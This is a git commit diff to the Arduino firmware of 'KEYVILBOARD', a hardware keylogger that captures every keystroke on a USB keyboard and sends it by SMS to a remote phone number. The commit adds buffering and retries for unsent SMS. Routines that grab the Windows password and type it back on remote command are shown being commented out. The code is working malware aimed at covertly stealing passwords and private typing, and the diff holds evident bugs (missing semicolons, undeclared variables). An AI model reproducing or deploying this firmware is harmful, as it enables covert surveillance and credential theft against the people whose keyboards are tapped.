1c05ac2088b548759217f2947afa867e07081818
0ca <francisco.oca.gonzalez@gmail.com>
2019-05-10 12:49:00 -0400

    Modify code to support pending SMS

--- SMS version/KEYVILBOARD/KEYVILBOARD.ino
+++ SMS version/KEYVILBOARD/KEYVILBOARD.ino
@@ -21,7 +21,7 @@ char TextSms[CHAR_LIMIT+2];
 int char_count;                              
 char backupTextSms[CHAR_LIMIT+2];
 unsigned long previousMillis=0;
-int interval=3000;
+int interval=60000;
 int interval_payload=15000;
 String SMS = "";
 int passcached=0;
@@ -32,6 +32,8 @@ byte b;
 String substr = "";
 int state = STATE_IDLE;
 
+bool pendingSMS = false;
+String buffer_keystrokes = "";
 
 // Flush buffer of the SMS serial
 void SMSSerialFlush(){
@@ -113,24 +115,29 @@ int sendSMSMessage(String txt){
 
   SMSSERIAL.write(txt.c_str());
   delay(2);
+  if (pendingBuffer == "")
+    pendingBuffer = txt;
+  else {
+    pendingBuffer += txt;
+  }
 
   SMSSerialFlush();
   
   SMSSERIAL.write((char)26);
   delay(2);
 
-  String res = readResponse();
+  //String res = readResponse();
 
-  if(res.indexOf("CMGS:") > 0){
-    if (DEBUG){
-      Serial.println("SMS message succesfully sent");
-    }
-    return 1;  
-  }
-
-  if (DEBUG){
-    Serial.println("Error sending SMS message");
-  }
+//  if(res.indexOf("CMGS:") > 0){
+//    if (DEBUG){
+//      Serial.println("SMS message succesfully sent");
+//    }
+//    return 1;  
+//  }
+//
+//  if (DEBUG){
+//    Serial.println("Error sending SMS message");
+//  }
   return 0; 
 }
 
@@ -151,98 +158,133 @@ void setup() {
                                             
 }
 
-
 void loop() {    
 //  sendSMSMessage("otro test");
 //  delay(55000);
-
   
   unsigned long currentMillis = millis();
-  b = USBhost.GetKey();        
-//Get windows passmethod
-  if( passcached == 0 && char_count > 0){
-        while(b != 10){
-         b = USBhost.GetKey();
-         if(b){
-          if(b == 8){
-            if(password_char_count > 0){
-              password_char_count--;
-              password[password_char_count] = empty;
-              }
-            }
-          else{
-           password[password_char_count++] = (char)b;   
-            }
-          previousMillis = currentMillis;
-          }
-        }
-      passcached++;
+  b = USBhost.GetKey();    
 
-      sendSMSMessage(String(password));
-//      SMSSERIAL.write("AT+CMGF=1\r\n");
-//      delay(2);
-//      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
-//      delay(2);
-//      SMSSERIAL.write(password); 
-//      SMSSERIAL.write((char)26);
-    }
-  
   //Normalkey capture
   if(b){
+    // Backspace
     if(b == 8){
-      if(char_count > 0){
-        char_count--;
-        TextSms[char_count] = empty;
+      if(buffer_keystrokes.length() > 0){
+        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1)  
       }
     }
     else {
-      TextSms[char_count++] = (char)b;
+      buffer_keystrokes += (char)b;
       }
     previousMillis = currentMillis;  
   }
+
   //SMS send
-  if (char_count == CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && char_count > 5) {
-//      SMSSERIAL.write("AT+CMGF=1\r\n");
-//      delay(2);
-//      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
-//      delay(2);
-//      SMSSERIAL.write(TextSms); 
-//      SMSSERIAL.write((char)26);
-      sendSMSMessage(String(TextSms));
-      memset(TextSms, 0, sizeof(TextSms));
-      char_count = 0; 
+  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5) {
+    if (!pendingSMS) {
+      // The buffer could hold a lot of characters from previous SMS that couldn't be sent
+      String bufferToSend = "";
+      if (buffer_keystrokes.length() < CHAR_LIMIT - 1) {
+        bufferToSend = buffer_keystrokes;
+      }
+      else {
+        bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
+      }
+      if(DEBUG){
+        Serial.println("Trying to send message with content: " + bufferToSend);
+      }
+      
+      sendSMSMessage(bufferToSend);
+      pendingSMS = true;
+      pendingLength = bufferToSend.length();
     } 
+    else {
+      if(DEBUG){
+        Serial.println("There is a SMS pending to be sent...");
+      }
+    }
+  }
+
+  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
+  if (pendingSMS) {
+    if (SMSSERIAL.available()) {
+      String res = SMSSERIAL.readStr()
+      Serial.println("Message read from SMSSERIAL: " + res);
+      if (res.indexOf("CMGS:") > 0){
+        Serial.println("SMS message succesfully sent");
+        pendingSMS = false;
+        // We removed from the buffer the characters that were sent
+        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
+      }
+      // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
+      else if (res.indexOf("ERROR")) {
+        // The SMS couldn't be sent, we need to retry
+        if(DEBUG){
+          Serial.println("Trying to send message with content: " + bufferToSend);
+        }
+        sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
+      }
+    }
+  } 
+     
+//Get windows passmethod
+//  if( passcached == 0 && char_count > 0){
+//        while(b != 10){
+//         b = USBhost.GetKey();
+//         if(b){
+//          if(b == 8){
+//            if(password_char_count > 0){
+//              password_char_count--;
+//              password[password_char_count] = empty;
+//              }
+//            }
+//          else{
+//           password[password_char_count++] = (char)b;   
+//            }
+//          previousMillis = currentMillis;
+//          }
+//        }
+//      passcached++;
+//
+//      sendSMSMessage(String(password));
+////      SMSSERIAL.write("AT+CMGF=1\r\n");
+////      delay(2);
+////      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
+////      delay(2);
+////      SMSSERIAL.write(password); 
+////      SMSSERIAL.write((char)26);
+//    }
+
 
    //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
-      if (SMSSERIAL.available() && (unsigned long)(currentMillis - previousMillis) >= interval_payload) {  
-      SMS = SMSSERIAL.readString();    
-      if(SMS.indexOf("Execute:Payload") > -1){
-      Serial.print(password); // Payload
-      Keyboard.press(KEY_HOME);
-      Keyboard.releaseAll();
-      delay(500);
-      Keyboard.print(password);
-      Keyboard.press('\n');
-      Keyboard.releaseAll();
-     }
-     if(SMS.indexOf("Password:Reveal") > -1){ //Keyword
-//      SMSSERIAL.write("AT+CMGF=1\r\n");
-//      delay(2);
-//      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
-//      delay(2);
-//      SMSSERIAL.write(password); 
-//      SMSSERIAL.write((char)26);
-        sendSMSMessage(String(password));
-        char_count = 0;
-     }
-     if(SMS.indexOf("Manual:") > -1){       
-         substr = SMS.substring(57); //start from char 57 57 = : in Manual: 
-         Keyboard.print(substr);
-      }
-    //Manual Password overwrite incase first entry was wrong.
-     if(SMS.indexOf("ManualPass:") > -1){       
-         substr = SMS.substring(61);
-         substr.toCharArray(password, 127);
-      } 
-  } 
+//    if (SMSSERIAL.available() && (unsigned long)(currentMillis - previousMillis) >= interval_payload) {  
+//      SMS = SMSSERIAL.readString();    
+//      if(SMS.indexOf("Execute:Payload") > -1){
+//      Serial.print(password); // Payload
+//      Keyboard.press(KEY_HOME);
+//      Keyboard.releaseAll();
+//      delay(500);
+//      Keyboard.print(password);
+//      Keyboard.press('\n');
+//      Keyboard.releaseAll();
+//     }
+//     if(SMS.indexOf("Password:Reveal") > -1){ //Keyword
+////      SMSSERIAL.write("AT+CMGF=1\r\n");
+////      delay(2);
+////      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
+////      delay(2);
+////      SMSSERIAL.write(password); 
+////      SMSSERIAL.write((char)26);
+//        sendSMSMessage(String(password));
+//        char_count = 0;
+//     }
+//     if(SMS.indexOf("Manual:") > -1){       
+//         substr = SMS.substring(57); //start from char 57 57 = : in Manual: 
+//         Keyboard.print(substr);
+//      }
+//    //Manual Password overwrite incase first entry was wrong.
+//     if(SMS.indexOf("ManualPass:") > -1){       
+//         substr = SMS.substring(61);
+//         substr.toCharArray(password, 127);
+//      }  
 }
